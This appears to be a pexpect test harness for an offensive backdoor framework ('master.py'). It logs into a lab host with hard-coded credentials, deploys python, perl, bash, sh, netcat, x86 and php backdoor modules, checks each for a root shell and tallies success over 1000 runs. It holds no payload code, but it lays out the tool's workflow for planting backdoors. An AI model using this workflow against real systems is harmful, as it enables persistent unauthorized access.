from master import *
#from nose.tools import nottest
import pexpect
import random

def testAddTarget():
    child = pexpect.spawn('python master.py')
    child.expect('Using local IP')
    child.sendline('addtarget')
    child.expect('Target Hostname:')
    child.sendline('192.168.121.153')
    child.expect('Username:')
    child.sendline('george')
    child.expect('Password:')
    child.sendline("password")
    child.expect('Target')
    child.sendline('open')
    child.expect('Connection established.')
    return child

def testPyth():
	child = testAddTarget()
	child.sendline('use shell/pyth')
	child.expect('Using Python module...')
	port = random.randrange(1024, 65535, 1)
	child.sendline('set port ' + str(port))
	child.expect('port => ' + str(port))
	child.sendline('exploit')
	child.expect('Python backdoor on')
	child.sendline('spawn')
	child.expect('Press Control \+ ] to exit the shell.')
	child.sendline('whoami')
	child.expect('root', timeout=10)
	#print("weve got rood")

def testPerl():
	child = testAddTarget()
	child.sendline('use shell/perl')
	child.expect('Using Perl module...')
	port = random.randrange(1024, 65535, 1)
	#port = 53921
	child.sendline('set port ' + str(port))
	child.expect('port => ' + str(port))
	child.sendline('exploit')
	child.expect('Perl backdoor on')
	child.sendline('spawn')
	child.expect('Press Control \+ ] to exit the shell.')
	child.sendline('whoami')
	child.expect('root', timeout=10)
	#print("weve got rood")

def testBash():
	child = testAddTarget()
	child.sendline('use shell/bash')
	child.expect('Using Bash backdoor...')
	port = random.randrange(1024, 65535, 1)
	child.sendline('set port ' + str(port))
	child.expect('port => ' + str(port))
	child.sendline('exploit')
	child.expect('Bash Backdoor on')
	child.sendline('spawn')
	child.expect('Press Control \+ ] to exit the shell.')
	child.sendline('whoami')
	child.expect('root', timeout=10)
	#print("weve got rood")

def testSh():
	child = testAddTarget()
	child.sendline('use shell/sh')
	child.expect('Using Sh backdoor...')
	port = random.randrange(1024, 65535, 1)
	child.sendline('set port ' + str(port))
	child.expect('port => ' + str(port))
	child.sendline('exploit')
	child.expect('Sh Backdoor on')
	child.sendline('spawn')
	child.expect('Press Control \+ ] to exit the shell.')
	child.sendline('whoami')
	child.expect('root', timeout=10)
	#print("weve got rood")

def testSh2():
	child = testAddTarget()
	child.sendline('use shell/sh2')
	child.expect('Using second Sh module..')
	port = random.randrange(1024, 65535, 1)
	child.sendline('set port ' + str(port))
	child.expect('port => ' + str(port))
	child.sendline('exploit')
	child.expect('Initializing backdoor...')
	child.sendline('spawn')
	child.expect('Press Control \+ ] to exit the shell.')
	child.sendline('whoami')
	child.expect('root', timeout=10)
	#print("weve got rood")

def testBash2():
	child = testAddTarget()
	child.sendline('use shell/bash2')
	child.expect('Using second Bash module...')
	port = random.randrange(1024, 65535, 1)
	child.sendline('set port ' + str(port))
	child.expect('port => ' + str(port))
	child.sendline('exploit')
	child.expect('Initializing backdoor...')
	child.sendline('spawn')
	child.expect('Press Control \+ ] to exit the shell.')
	child.sendline('whoami')
	child.expect('root', timeout=10)
	#print("weve got rood")

def testx86():
	child = testAddTarget()
	child.sendline('use shell/x86')
	child.expect('Using x86 module...')
	port = random.randrange(1024, 65535, 1)
	child.sendline('set port ' + str(port))
	child.expect('port => ' + str(port))
	child.sendline('exploit')
	child.expect('x86 backdoor on')
	child.sendline('spawn')
	child.expect('Press Control \+ ] to exit the shell.')
	child.sendline('whoami')
	child.expect('root', timeout=10)
	#print("weve got rood")

def testNc():
	child = testAddTarget()
	child.sendline('use shell/netcat')
	child.expect('Using netcat backdoor...')
	port = random.randrange(1024, 65535, 1)
	child.sendline('set port ' + str(port))
	child.expect('port => ' + str(port))
	child.sendline('exploit')
	child.expect('Netcat backdoor on')
	child.sendline('spawn')
	child.expect('Press Control \+ ] to exit the shell.')
	child.sendline('whoami')
	child.expect('george', timeout=10)
	#print("weve got rood")

def testPHP():
	child = testAddTarget()
	child.sendline('use shell/php')
	child.expect('Using php module...')
	port = random.randrange(1024, 65535, 1)
	child.sendline('set port ' + str(port))
	child.expect('port => ' + str(port))
	child.sendline('exploit')
	child.expect('Initializing backdoor...')
	child.sendline('spawn')
	child.expect('Press Control \+ ] to exit the shell.')
	child.sendline('whoami')
	child.expect('root', timeout=10)
	#print("weve got rood")

i = 0
j = 0
while i < 1000:
	#if(i % 10 == 0):
		#print i
	try:
		testPyth()
		j += 1
		i += 1
	except:
		#print("Failure")
		i += 1

print "-------------"
print "Python final: " + str(j) + "/" + str(i)
print "-------------"

i = 0
j = 0
while i < 1000:
	#if(i % 10 == 0):
		#print i
	try:
		testPerl()
		j += 1
		i += 1
	except:
		#print("Failure")
		i += 1

print "-------------"
print "Perl final: " + str(j) + "/" + str(i)
print "-------------"

i = 0
j = 0
while i < 1000:
	#if(i % 10 == 0):
		#print i
	try:
		testBash()
		j += 1
		i += 1
	except:
		#print("Failure")
		i += 1

print "-------------"
print "Bash final: " + str(j) + "/" + str(i)
print "-------------"

i = 0
j = 0
while i < 1000:
	#if(i % 10 == 0):
		#print i
	try:
		testSh()
		j += 1
		i += 1
	except:
		#print("Failure")
		i += 1

print "-------------"
print "Sh final: " + str(j) + "/" + str(i)
print "-------------"


i = 0
j = 0
while i < 1000:
	#if(i % 10 == 0):
		#print i
	try:
		testSh2()
		j += 1
		i += 1
	except:
		#print("Failure")
		i += 1

print "-------------"
print "Sh2 final: " + str(j) + "/" + str(i)
print "-------------"

i = 0
j = 0
while i < 1000:
	#if(i % 10 == 0):
		#print i
	try:
		testBash2()
		j += 1
		i += 1
	except:
		#print("Failure")
		i += 1

print "-------------"
print "Bash2 final: " + str(j) + "/" + str(i)
print "-------------"


i = 0
j = 0
while i < 1000:
	#if(i % 10 == 0):
		#print i
	try:
		testNc()
		j += 1
		i += 1
	except:
		#print("Failure")
		i += 1

print "-------------"
print "Netcat final: " + str(j) + "/" + str(i)
print "-------------"


i = 0
j = 0
while i < 1000:
	#if(i % 10 == 0):
		#print i
	try:
		testx86()
		j += 1
		i += 1
	except:
		#print("Failure")
		i += 1

print "-------------"
print "x86 final: " + str(j) + "/" + str(i)
print "-------------"

i = 0
j = 0
while i < 1000:
	#if(i % 10 == 0):
		#print i
	try:
		testPHP()
		j += 1
		i += 1
	except:
		#print("Failure")
		i += 1

print "-------------"
print "Php final: " + str(j) + "/" + str(i)
print "-------------"